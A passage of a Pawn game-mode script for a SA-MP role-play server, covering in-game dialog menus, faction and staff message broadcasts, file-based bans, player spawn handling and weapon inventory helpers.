		    format(string, sizeof(string), "Slot 0 (%s)\nSlot 1 (%s)\nSlot 2 (%s)\nSlot 3 (%s)\nSlot 4 (%s)\nSlot 5 (%s)\nSlot 6 (%s)\nSlot 7 (%s)\nSlot 8 (%s)\nSlot 9 (%s)", RPTN(playerid, 0), RPTN(playerid, 1), RPTN(playerid, 2), RPTN(playerid, 3), RPTN(playerid, 4), RPTN(playerid, 5), RPTN(playerid, 6), RPTN(playerid, 7), RPTN(playerid, 8), RPTN(playerid, 9));
			ShowPlayerDialog(playerid, 23, DIALOG_STYLE_LIST, "Your toys", string, "Choose", "Cancel");
		}
		case 24: // Toy Add/Remove/Edit
		{
		    new info[16], type[16];
		    if(!IsPlayerAttachedObjectSlotUsed(playerid, toyslot[playerid])) format(info, sizeof(info), "Show Toy");
		    else format(info, sizeof(info), "Hide Toy");
		    format(string, sizeof(string), "%s\nEdit Toy", info);
		    format(type, sizeof(type), "Toy Slot %d", toyslot[playerid]);
		    ShowPlayerDialog(playerid, 24, DIALOG_STYLE_LIST, type, string, "Choose", "Back");
		}
		case 25: // Toy adding bones
		{
		    ShowPlayerDialog(playerid, 25, DIALOG_STYLE_LIST, "Choose a bone", "Spine\nHead\nLeft upper arm\nRight upper arm\nLeft hand\nRight hand\nLeft thigh\nRight thigh\nLeft foot\nRight foot\nRight calf\nLeft calf\nLeft forearmRight forearm\nLeft clavicle\nRight clavicle\nNeck\nJaw", "Choose", "Back");
		}
		case 26: // Licenses
		{
		    format(string, sizeof(string), "Licenses Disk.");
		    ShowPlayerDialog(playerid, 26, DIALOG_STYLE_LIST, string, "Car License ($800)\nFlying License ($8000)\nWeapon License ($12000)\nFishing License ($2000)", "Buy", "Quit");
		}
		case 27: // NA Lockers
		{
		    ShowPlayerDialog(playerid, 27, DIALOG_STYLE_LIST, "NA Lockers", "Camera\nClothes", "Choose", "Cancel");
		}
		case 28: // VIP Statistics
		{
		    ShowPlayerDialog(playerid, 28, DIALOG_STYLE_LIST, "VIP Statistics:", "Age change\nGender change\n{DBA901}Name Change", "Choose", "Cancel");
		}
		case 29: // VIP Adv
		{
		    ShowPlayerDialog(playerid, 29, DIALOG_STYLE_LIST, "Advertisement Coloring", "Original Color\nOrange Color\nPink Color\nRed Color", "Choose", "Cancel");
		}
		case 30: // VIP advertise
		{
		    ShowPlayerDialog(playerid, 30, DIALOG_STYLE_INPUT, "VIP Advertisement","Please write your advertisement below in the given place.", "Choose", "Cancel");
		}
		case 31: // VIP advertise
		{
		    ShowPlayerDialog(playerid, 31, DIALOG_STYLE_INPUT, "VIP Advertisement","Please write your advertisement below in the given place.", "Choose", "Cancel");
		}
		case 32: // Change name
		{
		    ShowPlayerDialog(playerid, 32, DIALOG_STYLE_INPUT, "Name Change","Type in your new name (Admins will approve/disapprove ASAP)", "Submit", "Cancel");
		}
		case 33: // VIP advertise
		{
		    ShowPlayerDialog(playerid, 33, DIALOG_STYLE_INPUT, "VIP Advertisement","Please write your advertisement below in the given place.", "Choose", "Cancel");
		}
		case 34: // VIP Hospital Spawn
		{
		    ShowPlayerDialog(playerid, 34, DIALOG_STYLE_LIST, "Hospital Spawn", "Ganton Gym Spawn\nLos Santos Police Department Spawn\nAll Saints Hospital Spawn", "Choose", "Cancel");
		}
		case 35: // Vehicle Dealership
		{
		    ShowPlayerDialog(playerid, 35, DIALOG_STYLE_LIST, "Vehicle Dealership", "Regular Cars\nLowriders\nSaloon\n4x4/Off-Roaders\nBikes\nExotic Cars\nSports Cars", "Choose", "Cancel");
		}
		case 36: // Regular Cars
		{
		    ShowPlayerDialog(playerid, 36, DIALOG_STYLE_LIST, "Vehicle Dealership", "Blista Compact ($200,000)\nClover ($100,000)\nStallion ($180,000)\nTampa ($200,000)", "Buy", "Cancel");
		}
		case 37: // Lowriders
		{
		    ShowPlayerDialog(playerid, 37, DIALOG_STYLE_LIST, "Vehicle Dealership", "Blade ($220,000)\nRemington ($175,000)\nSavanna ($250,000)\nSlamvan ($280,000)\nTornado ($230,000)", "Buy", "Cancel");
		}
		case 38: // Saloon
		{
		    ShowPlayerDialog(playerid, 38, DIALOG_STYLE_LIST, "Vehicle Dealership", "Elegant ($240,000)\nPremier ($290,000)\nSentinel ($250,000)\nSunrise ($230,000)\nWashington ($190,000)", "Buy", "Cancel");
		}
		case 39: // 4x4/Off-Roaders
		{
		    ShowPlayerDialog(playerid, 39, DIALOG_STYLE_LIST, "Vehicle Dealership", "Huntley ($320,000)\nLandstalker ($270,000)\nMesa ($250,000)\nRancher ($300,000)\nSandking ($430,000)\nYosemite ($240,000)", "Buy", "Cancel");
		}
		case 40: // Bikes
		{
		    ShowPlayerDialog(playerid, 40, DIALOG_STYLE_LIST, "Vehicle Dealership", "Wayfarer ($150,000)\nFCR-900 ($225,000)\nPCJ-600 ($200,000)\nFreeway ($175,000)\nSanchez ($85,000)\nBMX ($10,000)", "Buy", "Cancel");
        }
        case 41: // Exotic Cars
		{
		    ShowPlayerDialog(playerid, 41, DIALOG_STYLE_LIST, "Vehicle Dealership", "Banshee ($550,000)\nBuffalo ($640,000)\nUranus ($250,000)\nClub ($265,000)\nAlpha ($215,000)", "Buy", "Cancel");
        }
        case 42: // Sports Cars
		{
		    ShowPlayerDialog(playerid, 42, DIALOG_STYLE_LIST, "Vehicle Dealership", "Cheetah ($1,250,000)\nBullet ($1,750,000)\nInfernus ($2,750,000)\nTurismo ($2,250,000)\nEuros ($270,000)\nSultan ($330,000)\nJester ($325,000)\nComet ($375,000)", "Buy", "Cancel");
        }
        case 43: // LSPD Armory
		{
		    ShowPlayerDialog(playerid, 43, DIALOG_STYLE_LIST, "Armory", "Nightstick\nMace\nDesert Eagle\nShotgun\nMP5\nM4\nCombat Shotgun\nSniper Rifle\nPainkiller\nVest\nGrenade (R4+)\nRifle\nAk-47", "Choose", "Cancel");
		}
		case 44: // LSPD Uniforms
		{
		    ShowPlayerDialog(playerid, 44, DIALOG_STYLE_LIST, "Uniforms","Cadet\nFemale Officer 1\nFemale Officer 2\nOfficer 1\nOfficer 2\nOfficer 3\nBlack Officer\nLatino Officer\nMotorcycle Officer\nSWAT Officer\nSergeant\nCaptain\nChief", "Choose", "Cancel");
		}
		case 45: // LSPD Clear Records
		{
		    ShowPlayerDialog(playerid, 45, DIALOG_STYLE_INPUT, "LSPD Clear Records","Who would you like to clear?", "Clear", "Close");
		}
		case 46: // LSPD Clothes Dialog
		{
		    ShowPlayerDialog(playerid, 46, DIALOG_STYLE_INPUT, "Clothes","Choose your clothes (( Skin ID ))", "Choose", "Cancel");
		}
		case 47: // LSFMD Locker
		{
		    ShowPlayerDialog(playerid, 47, DIALOG_STYLE_LIST, "LSFMD Lockers", "Duty\nUniforms", "Choose", "Cancel");
		}
		case 48: // LSFMD Uniforms
		{
		    ShowPlayerDialog(playerid, 48, DIALOG_STYLE_LIST, "LSFMD Uniforms", "Firefighter 1\nFirefighter 2\nFirefighter 3\nParamedic 1\nParamedic 2\nParamedic 3\nParamedic Girl", "Choose", "Cancel");
		}
		case 49: // Packages /purchase
		{
		    ShowPlayerDialog(playerid, 49, DIALOG_STYLE_LIST, "MOLE LIST", "Good Day Creation ($150,000)\nBad Day Removal ($100,000)", "Choose", "Cancel");
		}
		case 50: // Famed Points
		{
		    format(string, sizeof(string), "You have %d famed points.", Player[playerid][pFamedPoints]);
		    ShowPlayerDialog(playerid, 50, DIALOG_STYLE_LIST, string, "Refill Everybody's Health (2 Points)\nRepair All Vehicles (4 Points)\nRefill All Vehicles (6 Points)", "Confirm", "Cancel");
		}
		case 51: // VIP Vehicle Model
		{
		    ShowPlayerDialog(playerid, 51, DIALOG_STYLE_INPUT, "VIP Vehicle Model","Type in the vehicle ID you would like:", "Submit", "Cancel");
		}
		case 52: // VIP special weapons
		{
		    format(string, sizeof(string), "Deagle of Extra Damage (15 Points)\nAK-47 of Extra Health (16 Points)\nM4 of Extra Armor (17 Points)\nSPAS12 of Extra Health & Armor (18 Points)\nSniper of Sudden Death (20 Points)");
		    ShowPlayerDialog(playerid, 52, DIALOG_STYLE_LIST, "VIP Special Weapons", string, "Choose", "Cancel");
		}
		case 53: // FBI Lockers
		{
		    ShowPlayerDialog(playerid, 53, DIALOG_STYLE_LIST, "FBI Lockers", "Duty\nArmory\nUniforms", "Choose", "Cancel");
		}
		case 54: // DOC Uniforms
		{
		    ShowPlayerDialog(playerid, 54, DIALOG_STYLE_LIST, "DOC Uniform", "Correction Officer I\nCorrection Officer Female\nCorrection Officer II\nCorrection Officer III", "Choose", "Cancel");
		}
		case 55: // DOC Lockers
		{
		    ShowPlayerDialog(playerid, 55, DIALOG_STYLE_LIST, "DOC Lockers", "Duty\nUniforms", "Choose", "Cancel");
		}
	}
	return 1;
}

stock GiveZamoraMoney(playerid, amount)
{
	new string[128];
	if(amount < 0) format(string, sizeof(string), "~r~-$%d", amount*-1);
	else if(amount > 0) format(string, sizeof(string), "~g~+$%d", amount);
	GameTextForPlayer(playerid, string, 3000, 1);
	PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
	Player[playerid][pMoney] += amount;
	return 1;
}

stock SetZamoraMoney(playerid, amount)
{
    Player[playerid][pMoney] = amount;
	return 1;
}

stock split(const strsrc[], strdest[][], delimiter)
{
    new i, li;
    new aNum;
    new len;
    while(i <= strlen(strsrc))
    {
        if(strsrc[i] == delimiter || i == strlen(strsrc))
        {
            len = strmid(strdest[aNum], strsrc, li, i, 128);
            strdest[aNum][len] = 0;
            li = i+1;
            aNum++;
        }
        i++;
    }
    return 1;
}
stock SendPlayerFamMessage(playerid, color, string[])
{
	foreach(Player, i)
	{
		if(Logged(i) && Player[i][pFam] == Player[playerid][pFam])
		{
		    SendClientMessage(i, color, string);
		}
	}
	return 1;
}
stock SendRobberyMessage(color, string[])
{
	foreach(Player, playerid)
	{
	    if(BankRobber[playerid])
	    {
	        SendClientMessage(playerid, color, string);
	    }
	}
	return 1;
}
stock SendCopMessage(color, string[])
{
	foreach(Player, i)
	{
		if(Logged(i) && Player[i][pFac] == 1)
		{
		    SendClientMessage(i, color, string);
		}
	}
	return 1;
}
stock SendNAMessage(color, string[])
{
	foreach(Player, i)
	{
		if(Logged(i) && Player[i][pFac] == 4)
		{
		    SendClientMessage(i, color, string);
		}
	}
	return 1;
}
stock SendGovMessage(color, string[])
{
	foreach(Player, i)
	{
		if(Logged(i) && Player[i][pFac] == 2)
		{
		    SendClientMessage(i, color, string);
		}
	}
	return 1;
}
stock SendNGMessage(color, string[])
{
	foreach(Player, i)
	{
		if(Logged(i) && Player[i][pFac] == 7)
		{
		    SendClientMessage(i, color, string);
		}
	}
	return 1;
}
stock SendFBIMessage(color, string[])
{
	foreach(Player, i)
	{
		if(Logged(i) && Player[i][pFac] == 6)
		{
		    SendClientMessage(i, color, string);
		}
	}
	return 1;
}
stock SendMedicMessage(color, string[])
{
	foreach(Player, i)
	{
		if(Logged(i) && Player[i][pFac] == 5)
		{
		    SendClientMessage(i, color, string);
		}
	}
	return 1;
}
stock SendHitmanMessage(color, string[])
{
	foreach(Player, i)
	{
		if(Logged(i) && Player[i][pFac] == 3)
		{
		    SendClientMessage(i, color, string);
		}
	}
	return 1;
}
stock SendHighMessage(color, string[])
{
	foreach(Player, i)
	{
		if(Logged(i) && Player[i][pAdmin] >= 1337)
		{
		    SendClientMessage(i, color, string);
		}
	}
	return 1;
}
stock SendOwnerMessage(color, string[])
{
	foreach(Player, i)
	{
		if(Logged(i) && Player[i][pAdmin] >= 1338)
		{
		    SendClientMessage(i, color, string);
		}
	}
	return 1;
}
stock SendScripterMessage(color, string[])
{
	foreach(Player, i)
	{
        if(Logged(i) && Player[i][pScripters] >= 1)
		{
		    SendClientMessage(i, color, string);
		}
	}
	return 1;
}
stock SendAdminMessage(color, string[])
{
	foreach(Player, i)
	{
		if(Logged(i) && Player[i][pAdmin])
		{
		    SendClientMessage(i, color, string);
		}
	}
	return 1;
}
stock StaffWarn(color, string[])
{
	foreach(Player, i)
	{
		if(Logged(i) && Player[i][pStaffObserver])
		{
			SendClientMessage(i, color, string);
		}
	}
	return 1;
}
stock SendVIPMessage(color, string[])
{
	foreach(Player, i)
	{
		if(Logged(i) && Player[i][pVIP] && !VIPOff[i])
		{
		    SendClientMessage(i, color, string);
		}
	}
	return 1;
}
stock SendTesterMessage(color, string[])
{
	foreach(Player, i)
	{
		if(Logged(i) && Player[i][pTester])
		{
		    SendClientMessage(i, color, string);
		}
	}
	return 1;
}
stock SendOldschoolMessage(color, string[])
{
	foreach(Player, i)
	{
		if(Logged(i) && Player[i][pFamed])
		{
		    SendClientMessage(i, color, string);
		}
	}
	return 1;
}
stock SendMapperMessage(color, string[])
{
	foreach(Player, i)
	{
		if(Logged(i) && Player[i][pMapper])
		{
		    SendClientMessage(i, color, string);
		}
	}
	return 1;
}

stock SendHelperMessage(color, string[])
{
	foreach(Player, i)
	{
		if(Logged(i) && Player[i][pHelper])
		{
		    SendClientMessage(i, color, string);
		}
	}
	return 1;
}

stock SendPlayerFactionMessage(playerid, rank, color, string[])
{
	foreach(Player, i)
	{
		if(Logged(i) && Player[i][pFac] == Player[playerid][pFac] && Player[i][pFacRank] >= rank)
		{
		    SendClientMessage(i, color, string);
		}
	}
	return 1;
}

stock Log(sz_fileName[], sz_input[]) {

	new	sz_logEntry[156], i_dateTime[2][3], File: fileHandle = fopen(sz_fileName, io_append);
	gettime(i_dateTime[0][0], i_dateTime[0][1], i_dateTime[0][2]);
	getdate(i_dateTime[1][0], i_dateTime[1][1], i_dateTime[1][2]);
	format(sz_logEntry, sizeof(sz_logEntry), "[%i/%i/%i - %i:%i:%i] %s\r\n", i_dateTime[1][0], i_dateTime[1][1], i_dateTime[1][2], i_dateTime[0][0], i_dateTime[0][1], i_dateTime[0][2], sz_input);
	fwrite(fileHandle, sz_logEntry);
	return fclose(fileHandle);
}

forward AddBan(playerid);
public AddBan(playerid)
{
	new file[64], IP[16];
	format(Player[playerid][pIP], 16, "%s", dini_Get(file, "IP"));
	GetPlayerIp(playerid, IP, sizeof(IP));
    format(IP, sizeof(IP), "Bans/%s", IP);
	dini_Set(file, "IP", IP);
	dini_Create(IP);
   	// BanList
   	new file2[64];
    format(file2, sizeof(file2), "Bans/%s.ini", GetAccountName(playerid));
  	dini_Create(file2);
}
forward AddRangeBan(playerid);
public AddRangeBan(playerid)
{
 	new file[64], IP[16];
 	format(Player[playerid][pIP], 16, "%s", dini_Get(file, "IP"));
	GetPlayerIp(playerid, IP, sizeof(IP));
    format(file, sizeof(file), "Bans/%s.ini", GetAccountName(playerid));
    format(IP, sizeof(IP), "Bans/%s", IP);
	dini_Create(file);
	dini_Create(IP);
	dini_Set(file, "IP", IP);
	dini_Set(file, "Banned", "Rangeban");
	dini_Set(IP, "Banned", "Rangeban");
}
forward CheckBan(playerid);
public CheckBan(playerid)
{
    new file[64];
    format(file, sizeof(file), "Bans/%s.ini", GetAccountName(playerid));
    if(dini_Exists(file)) return 1;
    return 0;
}
forward CheckIPBan(playerid);
public CheckIPBan(playerid)
{
    new file[64], IP[16];
    format(Player[playerid][pIP], 16, "%s", dini_Get(file, "IP"));
    GetPlayerIp(playerid, IP, sizeof(IP));
    format(file, sizeof(file), "Bans/%s", IP);
    if(dini_Exists(file)) return 1;
    return 0;
}


fdeleteline(filename[], line)
{
  new count, string[256], File:file, File:temp;

  file= fopen(filename, io_read);
  temp = fopen("tmpfile.tmp", io_write);

  while (fread(file, string))
    if (++count != line)
      fwrite(temp, string);

  fclose(file);
  fclose(temp);

  file= fopen(filename, io_write);
  temp = fopen("tmpfile.tmp", io_read);

  while (fread(temp, string))
    fwrite(file, string);

  fclose(file);
  fclose(temp);
  fremove("tmpfile.tmp");
}

stock IsValidIP(ip[])
{
    new a;
	for (new i = 0; i < strlen(ip); i++)
	{
		if (ip[i] == '.')
		{
		    a++;
		}
	}
	if (a != 3)
	{
	    return 1;
	}
	return 0;
}
stock SpawnChar(playerid)
{
    if(Logged(playerid))
	{
	    // Tutorial
	    if(!Player[playerid][pTutorial])
	    {
	        SetZamoraMoney(playerid, 7500);
	        Player[playerid][pBank] = 15000;
            //SetTimerEx("Tut1", 2000, false, "i", playerid);
	    }
	    TogglePlayerControllable(playerid, 1);
	    // Family Strikes
	    if(Player[playerid][pFam])
	    {
	        new idx = Player[playerid][pFam];
			if(FamInfo[idx][fStrikes] >= 3)
			{
			    Player[playerid][pFam] = 0;
				Player[playerid][pFamRank] = 0;
				SendClientMessage(playerid, COLOR_LIGHTBLUE, "Your family has been disbanded due to recieving 3 strikes, you have been autokicked from the family.");
			}
	    }
	    // Website
	    TextDrawShowForPlayer(playerid, WebTD);
	    // Time
	    TextDrawShowForPlayer(playerid, TimeTD);
	    // Name Color & Level & Wanted Level
		SetPlayerScore(playerid, Player[playerid][pLevel]);
	    SetPlayerColor(playerid, TRANSPARENT_WHITE);
	    SetPlayerWantedLevel(playerid, Player[playerid][pWanted]);
	    // Download bar
		Download[playerid] = CreateProgressBar(499.00, 103.00, 107.50, 3.20, -16776961, 100.0);
		SetProgressBarMaxValue(Download[playerid], 100);
		SetProgressBarColor(Download[playerid], COLOR_GREEN);
		// Custom Int
		if(Player[playerid][pSpawnFreeze])
		{
		    SetTimerEx("EnterExitTimer", 5000, false, "i", playerid);
		}
	    // Business, House and Gates Checking
	    if(Player[playerid][pBiz] != 0 && strcmp(GetAccountName(playerid), BizInfo[Player[playerid][pBiz]][bOwner]) || Player[playerid][pBiz] != 0 && !strlen(BizInfo[Player[playerid][pBiz]][bOwner]))
	    {
			Player[playerid][pBiz] = 0;
			SendClientMessage(playerid, COLOR_WHITE, " An administrator has sold your business while you were offline.");
	    }
	    if(Player[playerid][pHouse] != 0 && strcmp(GetAccountName(playerid),  HouseInfo[Player[playerid][pHouse]][hOwner]) || Player[playerid][pHouse] != 0 && !strlen(HouseInfo[Player[playerid][pHouse]][hOwner]))
	    {
			Player[playerid][pHouse] = 0;
			SendClientMessage(playerid, COLOR_WHITE, " An administrator has sold your house while you were offline.");
	    }
	    // Spawning
	    if(Player[playerid][pX] == 0 && Player[playerid][pY] == 0 && Player[playerid][pZ] == 0)
	    {
	        SetPlayerPos(playerid, 2066.9724,-1926.7201,13.5469);
	        SetPlayerFacingAngle(playerid, 93.3274);
	        SetCameraBehindPlayer(playerid);
	        SetPlayerInterior(playerid, 0);
	        SetPlayerVirtualWorld(playerid, 0);
	        SetPlayerHealth(playerid, 100);
	    }
	    else
	    {
     	    SetPlayerVirtualWorld(playerid, Player[playerid][pVW]);
     	    SetPlayerInterior(playerid, Player[playerid][pInt]);
     	    SetCameraBehindPlayer(playerid);
	   	    SetPlayerPos(playerid, Player[playerid][pX], Player[playerid][pY], Player[playerid][pZ]);
	   	    // HP and Armor
	   		if(Player[playerid][pHealth] <= 0) Player[playerid][pHealth] = 1;
	   		SetPlayerHealth(playerid, Player[playerid][pHealth]);
	   		SetPlayerArmour(playerid, Player[playerid][pArmor]);
	   		// Skin
	        SetPlayerSkin(playerid, Player[playerid][pModel]);
       	    // Guns
       		for(new i = 0; i < 13; i++)
       		{
        	    if(Player[playerid][pWeapon][i]) GiveZamoraWeapon(playerid, Player[playerid][pWeapon][i], Player[playerid][pWeaponAmmo][i]);
        	}
	    }
		if(Paintball[playerid] == 1 && paintballdeath[playerid] == 1)
        {
        	GunsBeingRemoved[playerid] = 1;
        	ResetPlayerWeapons(playerid);
	    	GivePlayerWeapon(playerid, PaintballWep[0], 999999);
            GivePlayerWeapon(playerid, PaintballWep[1], 999999);
            SetPlayerHealth(playerid, 100);
   	        SetPlayerArmour(playerid, 100);
           	SetPlayerPos(playerid, 1295.4827,-3.2839,1001.0273);
           	SetPlayerInterior(playerid, 18);
          	SetPlayerVirtualWorld(playerid, 0);
     		paintballdeath[playerid] = 0;
     		Player[playerid][pDead] = 0;
			return 1;
		}
		if(eventdeath[playerid] == 1)
        {
			SetPlayerPos(playerid, eX, eY, eZ);
			SetPlayerInterior(playerid, Player[playerid][pInt]);
			SetPlayerVirtualWorld(playerid, Player[playerid][pVW]);
			Player[playerid][pHospital] = 0;
			SetPlayerHealth(playerid, eHP);
			SetPlayerArmour(playerid, eARMOR);
			SetPlayerSkin(playerid, Player[playerid][pModel]);
			SendClientMessage(playerid, COLOR_LIGHTSALMON, "*** You have been died in the event,beter luck next time. ***");
			GunsBeingRemoved[playerid] = 1;
			ResetPlayerWeapons(playerid);
			GunsBeingRemoved[playerid] = 1;
			Player[playerid][pDead] = 0;
			for(new w = 0; w < 13; w++)
			{
				GiveZamoraWeapon(playerid, Player[playerid][pWeapon][w], Player[playerid][pWeaponAmmo][w]);
			}
			eventdeath[playerid] = 0;
			return 1;
		}
		// Hospital
		if(!Player[playerid][pJail] && !Player[playerid][pPrison] && !Paintball[playerid] && !Event[playerid])
		{
			if(Player[playerid][pHospital])
			{
			    SetPlayerPos(playerid, 1177.5485,-1323.5773,11.0761);
			    SetPlayerCameraPos(playerid,1223.2250,-1289.4913,31.9257);
		   	    SetPlayerCameraLookAt(playerid,1177.5485,-1323.5773,14.0761);
				ResetZamoraWeapons(playerid);
				Player[playerid][pDead] = 0;
				Player[playerid][pFacDuty] = 0;
				SetPlayerInterior(playerid, 0);
			 	SetPlayerVirtualWorld(playerid, 0);
			    TogglePlayerControllable(playerid, 0);
				HospitalTime[playerid] = 30;
				if(Player[playerid][pVIP] >= 2) HospitalTime[playerid] = 1;
				HospitalCountDown[playerid] = SetTimerEx("HospitalTimer", 1000, false, "d", playerid);
				IsAfterLifing[playerid] = 0;
 			}
		}
		// LSPD-Jail
		if(Player[playerid][pJail] == 1)
		{
		    ResetZamoraWeapons(playerid);
		    SetPlayerColor(playerid, TRANSPARENT_WHITE);
			SetPlayerInterior(playerid, 0);
			TogglePlayerControllable(playerid, 0);
			SetTimerEx("EnterExitTimer", 5000, false, "i", playerid);
			new RandomCell = random(sizeof(RandomJail));
         	SetPlayerFacingAngle(playerid, RandomJail[RandomCell][3]);
         	SetPlayerPos(playerid, RandomJail[RandomCell][0], RandomJail[RandomCell][1], RandomJail[RandomCell][2]);
         	SetCameraBehindPlayer(playerid);
		}
		// Admin-Jail
		if(Player[playerid][pJail] == 2)
		{
			ResetZamoraWeapons(playerid);
		    SetPlayerColor(playerid, TRANSPARENT_WHITE);
			SetPlayerInterior(playerid, 0);
			TogglePlayerControllable(playerid, 0);
			SetTimerEx("EnterExitTimer", 5000, false, "i", playerid);
         	new RandomCell = random(sizeof(RandomJail));
         	SetPlayerFacingAngle(playerid, RandomJail[RandomCell][3]);
         	SetPlayerPos(playerid, RandomJail[RandomCell][0], RandomJail[RandomCell][1], RandomJail[RandomCell][2]);
         	SetCameraBehindPlayer(playerid);
		}
		// NG-Prison
		if(Player[playerid][pPrison] == 1)
		{
		    ResetZamoraWeapons(playerid);
		    SetPlayerColor(playerid, TRANSPARENT_WHITE);
			SetPlayerInterior(playerid, 0);
			TogglePlayerControllable(playerid, 0);
			SetTimerEx("EnterExitTimer", 5000, false, "i", playerid);
			new RandomCell = random(sizeof(RandomPrison));
         	SetPlayerFacingAngle(playerid, RandomPrison[RandomCell][3]);
         	SetPlayerPos(playerid, RandomPrison[RandomCell][0], RandomPrison[RandomCell][1], RandomPrison[RandomCell][2]);
         	SetCameraBehindPlayer(playerid);
		}
		// Admin-Prison
		if(Player[playerid][pPrison] == 2)
		{
			ResetZamoraWeapons(playerid);
		    SetPlayerColor(playerid, TRANSPARENT_WHITE);
			SetPlayerInterior(playerid, 0);
			TogglePlayerControllable(playerid, 0);
			SetTimerEx("EnterExitTimer", 5000, false, "i", playerid);
         	new RandomCell = random(sizeof(RandomPrison));
         	SetPlayerFacingAngle(playerid, RandomPrison[RandomCell][3]);
         	SetPlayerPos(playerid, RandomPrison[RandomCell][0], RandomPrison[RandomCell][1], RandomPrison[RandomCell][2]);
         	SetCameraBehindPlayer(playerid);
		}
	}
	return 1;
}

stock fcreate(filename[])
{
	if (fexist(filename)) return false;
	new File:fhnd;
	fhnd=fopen(filename,io_write);
	if (fhnd) {
		fclose(fhnd);
		return true;
	}
	return false;
}
stock IsPlayerAnAdmin(playerid)
{
	if(Player[playerid][pAdmin] >= 2) return 1;
	return 0;
}
stock IsAReporter(playerid)
{
	if(Player[playerid][pFac] == 4) return 1;
	return 0;
}

stock IsACop(playerid)
{
	if(Player[playerid][pFac] == 1) return 1;
	return 0;
}

stock IsAGov(playerid)
{
	if(Player[playerid][pFac] == 2) return 1;
	return 0;
}

stock IsAHitman(playerid)
{
	if(Player[playerid][pFac] == 3) return 1;
	return 0;
}
stock IsFBI(playerid)
{
	if(Player[playerid][pFac] == 6) return 1;
	return 0;
}
stock IsDOC(playerid)
{
	if(Player[playerid][pFac] == 7) return 1;
	return 0;
}
stock IsMedic(playerid)
{
	if(Player[playerid][pFac] == 5) return 1;
	return 0;
}

stock RemoveZamoraWeapon(playerid, weaponid) //Credits to whoever made this
{
	if(!IsPlayerConnected(playerid) || weaponid < 0 || weaponid > 50)
	    return;

	new
	    saveweapon[13],
	    saveammo[13];

	// Probably could be done using one loop
	for(new slot = 0; slot < 13; slot++)
	    GetPlayerWeaponData(playerid, slot, saveweapon[slot], saveammo[slot]);

	ResetPlayerWeapons(playerid);

	for(new slot; slot < 13; slot++)
	{
		if(saveweapon[slot] == weaponid || saveammo[slot] == 0)
			continue;

		GiveZamoraWeapon(playerid, saveweapon[slot], saveammo[slot]);
	}

	// give them weapon ID 0 to reset the current armed weapon
	// to a fist and not the last weapon in their inventory
	GiveZamoraWeapon(playerid, 0, 1);

}

stock SaveZamoraAmmo(playerid)
{
	for(new i = 0; i < 13; i++)
	{
	    new Guns[2][13];
	    GetPlayerWeaponData(playerid, i, Guns[0][i], Guns[1][i]);
		if(Player[playerid][pWeapon][i] == Guns[0][i])
		{
		    Player[playerid][pWeaponAmmo][i] = Guns[1][i];
		}
	}
	return 1;
}

stock ResetZamoraWeapons(playerid)
{
    GunsBeingRemoved[playerid] = 1;
    ResetPlayerWeapons(playerid);
    GunsBeingRemoved[playerid] = 1;
    PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
	for(new i = 0; i < 13; i++)
	{
	    GunsBeingRemoved[playerid] = 1;
	    Player[playerid][pWeapon][i] = 0;
	    GunsBeingRemoved[playerid] = 1;
	    Player[playerid][pWeaponAmmo][i] = 0;
	    GunsBeingRemoved[playerid] = 1;
	}
	GunsBeingRemoved[playerid] = 1;
	return 1;
}

/*stock GiveZamoraWeapon(playerid, weaponid, ammo)
{
	GunsBeingRemoved[playerid] = 1;
	PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
	if(weaponid == 0 || weaponid == 1)
	{ // Slot 0
	    GunsBeingRemoved[playerid] = 1;
	    Player[playerid][pWeapon][0] = weaponid;
	    GunsBeingRemoved[playerid] = 1;
	}
	else if(weaponid == 2 || weaponid == 3 || weaponid == 4 || weaponid == 5 || weaponid == 6 || weaponid == 7 || weaponid == 8 || weaponid == 9)
	{ // Slot 1
		GunsBeingRemoved[playerid] = 1;
	    Player[playerid][pWeapon][1] = weaponid;
	    GunsBeingRemoved[playerid] = 1;
	}
	else if(weaponid == 22 || weaponid == 23 || weaponid == 24)
	{ // Slot 2
	    GunsBeingRemoved[playerid] = 1;
	    Player[playerid][pWeapon][2] = weaponid;
	    GunsBeingRemoved[playerid] = 1;
	}
	else if(weaponid == 25 || weaponid == 26 || weaponid == 27)
	{ // Slot 3
	    GunsBeingRemoved[playerid] = 1;
	    Player[playerid][pWeapon][3] = weaponid;
	    GunsBeingRemoved[playerid] = 1;
	}
	else if(weaponid == 28 || weaponid == 29 || weaponid == 32)
	{ // Slot 4
	    GunsBeingRemoved[playerid] = 1;
	    Player[playerid][pWeapon][4] = weaponid;
	    GunsBeingRemoved[playerid] = 1;
	}
	else if(weaponid == 30 || weaponid == 31)
	{ // Slot 5
	    GunsBeingRemoved[playerid] = 1;
	    Player[playerid][pWeapon][5] = weaponid;
	    GunsBeingRemoved[playerid] = 1;
	}
	else if(weaponid == 33 || weaponid == 34)
	{ // Slot 6
	    GunsBeingRemoved[playerid] = 1;
	    Player[playerid][pWeapon][6] = weaponid;
	    GunsBeingRemoved[playerid] = 1;
	}
	else if(weaponid == 35 || weaponid == 36 || weaponid == 37 || weaponid == 38)
	{ // Slot 7
	    GunsBeingRemoved[playerid] = 1;
	    Player[playerid][pWeapon][7] = weaponid;
	    GunsBeingRemoved[playerid] = 1;
	}
	else if(weaponid == 16 || weaponid == 17 || weaponid == 18 || weaponid == 39)
	{ // Slot 8
	    GunsBeingRemoved[playerid] = 1;
	    Player[playerid][pWeapon][8] = weaponid;
	    GunsBeingRemoved[playerid] = 1;
	}
	else if(weaponid == 41 || weaponid == 42 || weaponid == 43)
	{ // Slot 9
	    GunsBeingRemoved[playerid] = 1;
	    Player[playerid][pWeapon][9] = weaponid;
	    GunsBeingRemoved[playerid] = 1;
	}
	else if(weaponid == 10 || weaponid == 11 || weaponid == 12 || weaponid == 13 || weaponid == 14 || weaponid == 15)
	{ // Slot 10
	    GunsBeingRemoved[playerid] = 1;
	    Player[playerid][pWeapon][10] = weaponid;
	    GunsBeingRemoved[playerid] = 1;
	}
	else if(weaponid == 44 || weaponid == 45 || weaponid == 46)
	{ // Slot 11
	    GunsBeingRemoved[playerid] = 1;
	    Player[playerid][pWeapon][11] = weaponid;
	    GunsBeingRemoved[playerid] = 1;
	}
	else if(weaponid == 40)
	{ // Slot 12
	    GunsBeingRemoved[playerid] = 1;
	    Player[playerid][pWeapon][12] = weaponid;
	    GunsBeingRemoved[playerid] = 1;
	}
	GivePlayerWeapon(playerid, weaponid, ammo);
	return 1;
}*/
stock GiveZamoraWeapon(playerid, weaponid, ammo)
{
	switch(weaponid)
	{
